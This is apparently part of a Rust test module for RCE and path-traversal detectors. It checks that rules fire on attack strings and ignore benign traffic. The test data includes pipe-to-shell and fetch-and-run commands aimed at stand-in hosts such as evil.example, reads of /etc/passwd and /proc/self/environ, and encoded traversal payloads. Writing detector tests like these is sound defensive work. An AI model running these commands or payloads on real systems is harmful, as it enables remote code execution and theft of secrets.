        assert!(rce_fire_all("$('#main').addClass('active')").is_none());
    }

    #[test]
    fn rce_shell_exec_flag_and_piped_shell_fire() {
        assert_eq!(
            rce_fire("sh -c 'id'").expect("sh -c fires").rule_key,
            "rce.shell_exec_flag"
        );
        assert_eq!(
            rce_fire("python3 -c 'import os'").expect("python -c fires").rule_key,
            "rce.shell_exec_flag"
        );
        assert_eq!(
            rce_fire("curl http://evil/x | bash")
                .expect("pipe to shell fires")
                .rule_key,
            "rce.piped_shell"
        );
    }

    #[test]
    fn rce_fetch_exec_requires_argument_and_strong_separator() {
        assert_eq!(
            rce_fire("; wget http://evil.example/x.sh")
                .expect("fetch exec fires")
                .rule_key,
            "rce.fetch_exec"
        );
        // `&&` is a strong separator and still fires.
        assert_eq!(
            rce_fire("x && curl http://evil.example/y")
                .expect("&& curl fires")
                .rule_key,
            "rce.fetch_exec"
        );
        // codex A-4: a SINGLE `&` is the query/form field separator, NOT a shell
        // separator — `&curl help` must stay clean.
        assert!(
            rce_fire("sort=asc&curl help").is_none(),
            "a single & before curl+arg must not fire (field separator, not shell)"
        );
        assert!(
            rce_fire("a=1& curl the docs").is_none(),
            "single & + space + curl + word must not fire"
        );
        // `curl` as a value with no space+arg must NOT fire fetch_exec.
        assert!(rce_fire("method=curl&url=x").is_none(), "bare curl param must not fire");
    }

    #[test]
    fn rce_sensitive_read_fires() {
        // The shape `cat$IFS/etc/passwd` collapses to after shell normalisation.
        assert_eq!(
            rce_fire("cat /etc/passwd").expect("sensitive read fires").rule_key,
            "rce.sensitive_read"
        );
        assert_eq!(
            rce_fire("head /proc/self/environ").expect("proc read fires").rule_key,
            "rce.sensitive_read"
        );
    }

    #[test]
    fn rce_cmd_sep_common_is_default_off() {
        // Fires only under the full rule set; the default set stays quiet.
        assert_eq!(
            rce_fire_all("; ls -la")
                .expect("cmd_sep_common fires with all rules")
                .rule_key,
            "rce.cmd_sep_common"
        );
        assert!(rce_fire("; ls -la").is_none(), "cmd_sep_common is default-off");
    }

    #[test]
    fn rce_clean_traffic_does_not_fire() {
        // Bare separators / short words / prose that the FP-narrowing must reject,
        // plus a broadened holdout corpus of real docs / Markdown / JSON / CI
        // config / ops forms (codex A-4).
        for clean in [
            "a|b",
            "x&y&z",
            "cmd=sort|filter",
            "price sort order asc",
            "please ssh into the box",
            "the shell script and batch job",
            "user=nc_admin&role=member",
            "download the curl manual",
            "run benchmark and sleep",
            "a && b are both true",
            "id=42&name=alice",
            "path=/var/www/html/index.php",
            "select cat from animals where id=1",
            r#"{"cmd":"list","args":["a","b"]}"#,
            // ── broadened holdout: docs / Markdown / JSON / CI / ops ──
            "mkfifo is a posix utility for creating named pipes",
            "see the `curl --help` output for all supported flags",
            "install with: apt-get install curl wget netcat",
            "the article explains how bash and python differ",
            "step 3: run the python script to build the report",
            r#"{"tool":"curl","description":"http client","enabled":true}"#,
            r#"{"pipeline":[{"name":"build"},{"name":"deploy"}]}"#,
            r#"{"commands":["echo hello","ls -la"]}"#,
            "docs mention nc, ncat and socat as alternatives",
            "search=cat&category=pets&sort=name",
            "message=please review the perl regex in module.pm",
            "note: use `python3 -m venv` to create a virtualenv",
            "the powershell tutorial covers variables and loops",
            "filename=report_and_summary.pdf&format=pdf",
            "user typed: I love my cat and my dog",
        ] {
            assert!(rce_fire(clean).is_none(), "clean RCE negative fired: {clean:?}");
        }
    }

    // ── Traversal T1 detector ────────────────────────────────────────────────

    fn trav_fire(text: &str) -> Option<DetectionFinding> {
        run(&TraversalStructuralDetector::new(), text)
    }

    fn trav_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&TraversalStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn traversal_all_rules_compile() {
        let det = TraversalStructuralDetector::with_all_rules();
        assert_eq!(
            det.rules.len(),
            TRAVERSAL_RULES.len(),
            "every traversal pattern must compile"
        );
    }

    #[test]
    fn traversal_default_on_excludes_plain_dotdot() {
        let det = TraversalStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["traversal.plain_dotdot", "traversal.sensitive_abs_ops"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "traversal.overlong",
            "traversal.encoded_dotdot",
            "traversal.sensitive_abs",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn traversal_encoded_dotdot_fires() {
        for enc in [
            "%2e%2e%2f",
            "..%2f..%2f..%2fetc",
            "%2e%2e/",
            "..%5cwindows",
            // mixed-depth: double-encoded `..` followed by a single-encoded
            // separator — a real bypass vector, intentionally kept.
            "%252e%252e%2f",
            // codex A-4 must-fix: fully double-encoded traversal — the double-
            // encoded dot-dot MUST be followed by the fully double-encoded
            // separator (`%252f`/`%255c`), not another encoded dot.
            "%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255cwindows",
        ] {
            let f = trav_fire(enc).unwrap_or_else(|| panic!("encoded traversal must fire: {enc}"));
            assert_eq!(f.attack, AttackKind::Traversal);
            assert!(matches!(f.rule_key, "traversal.encoded_dotdot" | "traversal.overlong"));
        }
        // codex A-4 must-fix: a BARE `%252e%252e` (double-encoded `..` with no
        // path separator, e.g. inside a filename) must NOT fire — it is only
        // `..`. Critically, a THIRD encoded dot is NOT a separator either —
        // `%252e%252e%252e` is three double-encoded dots with no `/`/`\`
        // anywhere, and must not be mistaken for traversal (this was the bug:
        // the old pattern accepted a further `%2e`/`%252e` as if it were a
        // separator).
        assert!(
            trav_fire("file=photo%252e%252ejpg").is_none(),
            "bare double-encoded dot-dot without a separator must not fire"
        );
        assert!(trav_fire("%252e%252e").is_none(), "bare %252e%252e is not traversal");
        assert!(
            trav_fire("%252e%252e%252e").is_none(),
            "three double-encoded dots with no path separator must not fire"
        );
        assert!(
            trav_fire("%2e%2e%2e").is_none(),
            "three single-encoded dots with no path separator must not fire"
        );
        assert!(
            trav_fire("an ellipsis in text...more content, no path here").is_none(),
            "plain ellipsis / filename-adjacent dots with no encoded separator must not fire"
        );
    }

    #[test]
    fn traversal_overlong_fires() {
        assert_eq!(
            trav_fire("..%c0%af..%c0%afetc/passwd")
                .expect("overlong traversal fires")
                .rule_key,
            "traversal.overlong"
        );
    }

    #[test]
    fn traversal_sensitive_abs_fires() {
        // The decoded form a base64/hex-wrapped traversal collapses to.
        assert_eq!(
            trav_fire("/etc/passwd").expect("sensitive abs fires").rule_key,
            "traversal.sensitive_abs"
        );
        assert_eq!(
            trav_fire(r"c:\windows\system32\cmd")
                .expect("windows abs fires")
                .rule_key,
            "traversal.sensitive_abs"
        );
    }

    #[test]
    fn traversal_plain_dotdot_default_off_but_fires_with_all() {
        // Plain `../` and the `....//` double-write bypass fire only under the
        // full rule set (the default set stays quiet to avoid relative-path FP).
        assert_eq!(
            trav_fire_all("../../../etc")
                .expect("plain dotdot fires with all")
                .rule_key,
            "traversal.plain_dotdot"
        );
        assert_eq!(
            trav_fire_all("....//....//")
                .expect("double-write fires with all")
                .rule_key,
            "traversal.plain_dotdot"
        );
        assert!(trav_fire("../../../etc").is_none(), "plain dotdot is default-off");
    }

    #[test]
    fn traversal_clean_traffic_does_not_fire() {
        for clean in [
            "./config/app.json",
            "version=1.2.3",
            "file=report_v2.pdf",
            "/api/v1/users/42",
            "path=/var/www/html",
            "name=my..file",
            "q=%2elearn&sort=asc",
            "../relative/import/path",
            "photo..2024.jpg",
            r#"{"path":"a/b/c","v":"3.4.5"}"#,
            // codex A-4: high-frequency legitimate ops/container paths are now
            // default-off — a bare mention must not fire on the production set.
            "resolver reads /etc/hosts for name lookups",
            "cgroup path is /proc/self/cgroup on this host",
            "healthcheck greps /proc/version for the kernel",
            "GET /proc/1/status returns process state",
            r#"{"mounts":["/etc/hosts","/etc/resolv.conf"]}"#,
            "file=photo%252e%252ejpg&album=trip",
        ] {
            assert!(trav_fire(clean).is_none(), "clean traversal negative fired: {clean:?}");
        }
        // The ops paths DO fire under the full rule set (proof they moved to the
        // default-off `traversal.sensitive_abs_ops`, not deleted).
        assert_eq!(
            trav_fire_all("cat /proc/self/environ")
                .expect("ops path fires with all rules")
                .rule_key,
            "traversal.sensitive_abs_ops"
        );
    }
}
